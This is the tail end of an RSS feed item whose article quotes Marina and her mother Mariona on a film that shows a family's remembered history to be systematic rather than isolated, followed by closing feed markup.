powerful," says Marina. "People think what happened in their own home was an isolated incident. We try to say: this history isn't individual, it was systematic."</p><p>Her mother Mariona still doubts her memory sometimes.</p><p>But, she says, "seeing it all reflected in the film, that gives it the weight of truth."</p></div></div>]]></description>
         </item>
     </channel>
 </rss>
